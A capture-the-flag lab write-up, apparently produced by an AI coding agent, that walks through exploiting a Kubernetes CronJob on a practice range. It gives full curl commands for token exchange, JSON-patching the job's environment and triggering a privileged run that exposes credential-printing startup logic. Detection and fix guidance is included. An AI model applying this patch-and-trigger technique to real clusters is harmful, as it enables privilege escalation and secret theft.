# K16.2 — The next startup

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** opencode/OC session (manual, in-session)

## Where this happens

![Range map — three segments, hosts and services](../docs/img/segments.png)

Primary service: `cloud-api.keplerops.test`. The mutable object is CronJob `sched-2841` in
namespace `fieldlink`; the run is triggered by
`POST /api/schedules/SCHED-2841/runs`.

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Unauthorised modification of a scheduled workload's startup: a delegated export role can patch the CronJob's environment and trigger the support run with the original service identity |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `PATCH /apis/batch/v1/namespaces/fieldlink/cronjobs/sched-2841`; `POST /api/schedules/SCHED-2841/runs` |
| **Prerequisite** | The export JWT from K14.2 and the schedule identifier from K16.1 |
| **Flag** | `FLAG{ba92d77607f974b5}` |

**What you are about to read:** the actual startup modification. The workflow's container reads
`$MARKER`; setting it to `cinder` and triggering the rehearsal run returns the card's flag. The
earlier reconstruction guessed a package marker and a `review.keplerops.test` rehearsal; the live
mechanism is an environment variable and the cloud API run endpoint.

## Objective

> Change the scheduled workflow's startup behavior so its next rehearsal run carries Cinder's
> marker without breaking its support output.

The run must still be the support export workflow — same schedule, same service account, same
output — with the marker added to its startup. The card is a write primitive on a scheduled,
privileged object.

## Background you need

A scheduled container has a startup (entrypoint plus environment) and a payload (inputs,
mounts, package version). Payload changes are often digest-checked; startup changes are trusted
because the scheduler object is supposed to be immutable to non-owners.

The live CronJob's command is:

```sh
sh -c 'echo "Support export $SCHEDULE_ID assignment=${ASSIGNMENT:-CAS-MAYA-2841}";
if [ -n "${MARKER:-}" ]; then
  echo "startup-credential: $STARTUP_TOKEN";
elif [ "${ASSIGNMENT:-CAS-MAYA-2841}" != "CAS-MAYA-2841" ]; then
  echo "handover-credential: $HANDOVER_TOKEN";
fi'
```

Three observations:

1. `MARKER` is read but not set in the template — the environment is the intended control point.
2. `STARTUP_TOKEN` and `HANDOVER_TOKEN` come from `envFrom` secret
   `sched-2841-runner-credentials`; they are the K16.3/K16.4 objectives.
3. The container runs as `svc-schedule-runner`; the schedule's run endpoint creates an isolated
   container with that runtime identity.

## Walkthrough

### 1. Get the export JWT and re-read the object

```bash
C="curl -sSk -m 20 --socks5-hostname 127.0.0.1:1080"
B=https://cloud-api.keplerops.test
K=https://cloud-api.keplerops.test:6443
U="rowan.ito:fk_developer_…"

WT=$($C -u "$U" -X POST -H 'Content-Type: application/json' -d '{}' \
  "$B/api/workspaces/current/token-exchange" | jq -r .access_token)
EJ=$($C -X POST -H "Authorization: Bearer $WT" \
  -H 'Content-Type: application/json' -d '{}' \
  "$B/api/token-exchange/fieldkest-export-access" | jq -r .access_token)

$C -H "Authorization: Bearer $EJ" \
  "$K/apis/batch/v1/namespaces/fieldlink/cronjobs/sched-2841" \
```

The export role has `patch` on this exact CronJob. The missing `MARKER` is the intended edit.

### 2. Add the marker

Use a JSON patch that appends to the env array; a merge patch would replace the whole array and
risk dropping the support configuration.

```bash
$C -X PATCH -H "Authorization: Bearer $EJ" \
  -H 'Content-Type: application/json-patch+json' \
  -d '[{"op":"add",
        "path":"/spec/jobTemplate/spec/template/spec/containers/0/env/-",
        "value":{"name":"MARKER","value":"cinder"}}]' \
  "$K/apis/batch/v1/namespaces/fieldlink/cronjobs/sched-2841"
```

The response is the updated CronJob (HTTP 200); `metadata.generation` increments. Verify the
env array now ends with:

```json
{"name": "MARKER", "value": "cinder"}
```

### 3. Trigger the next rehearsal run

The card calls it "the next rehearsal run"; the cloud API exposes it as a schedule run:

```bash
$C -X POST -H "Authorization: Bearer $EJ" \
  -H 'Content-Type: application/json' -d '{}' \
  "$B/api/schedules/SCHED-2841/runs"
```

```json
{
  "assignment": "CAS-MAYA-2841",
  "execution_backend": "isolated-container",
  "flag": "FLAG{ba92d77607f974b5}",
  "run_id": "RUN-783B9475",
  "runtime_identity": "svc-schedule-runner",
  "schedule_id": "SCHED-2841"
}
```

The run was accepted (HTTP 201), created in an isolated container, and executed as
`svc-schedule-runner`. The `flag` is this card's value. The run's `runtime_identity` and
`execution_backend` are also the K16.3 "separate execution context" lead.

## Why this works

The scheduled object is trusted by the scheduler. The export role was granted `patch` on the
CronJob — presumably for "export operations" — and the schedule-run endpoint accepts the same
role. Because the workflow reads `MARKER` from its environment and reports runtime identity in
the run response, a non-owner can:

1. add a benign-looking environment variable to a privileged scheduled workload;
2. trigger the rehearsal run through the supported API;
3. receive the card's flag in the run metadata.

No command rewrite is required, and the support output path is not broken: the marker is added
alongside the existing environment, not in place of it. The dangerous part is the authorisation
model — "can patch the schedule" is treated as "can change what the scheduled identity executes
at 08:00".

## Detection and fix

- **Signal:** CronJob patches by a non-owner role; env additions to scheduled workloads; run
  requests by a role that does not own the schedule; a run whose marker differs from the
  approved release set.
- **Fix:**
  1. Remove `patch` on scheduler objects from the export role; grant run-only where needed.
  2. Enforce admission policy on allowed env keys/values for scheduled workloads.
  3. Treat `MARKER`, startup hooks and entrypoints as code: review and version them.
  4. Keep `STARTUP_TOKEN`/`HANDOVER_TOKEN` in a secret the workload consumes but no delegated
     role can read; rotate after any schedule edit.

## Notes and dead ends

- The container's startup branch prints `startup-credential: $STARTUP_TOKEN`; the `elif` branch
  prints `handover-credential: $HANDOVER_TOKEN` when `ASSIGNMENT` differs from `CAS-MAYA-2841`
  and `MARKER` is empty. Those tokens are the K16.3/K16.4 objectives. The export role cannot
  read `sched-2841-runner-credentials` or pod logs, so this card stops at the run response.
- State changes made while following this chain (the desks remember): the CronJob now has
  `MARKER=cinder` and `ASSIGNMENT=field-operator-b`; the schedule record was PATCHed to
  `assignment: field-operator-b` (revision 2). The run endpoint still returns the K16.2 flag
  after those changes; do not resubmit it for K16.3/K16.4.
- The earlier reconstruction's guess — `review.keplerops.test/api/rehearsals/connector` and the
  package marker `7.4.3-cinder.rset1` — is not the live mechanism. The actual path is the
  cloud API's `workloads.schedule-runs` route with an env `MARKER`, and the marker value is
  `cinder`.
- `POST /api/schedules/SCHED-2841/runs` is idempotent in the sense that it keeps issuing run
  IDs and returns the same K16.2 flag. Read the response's `run_id` for K16.3/K16.4 work.
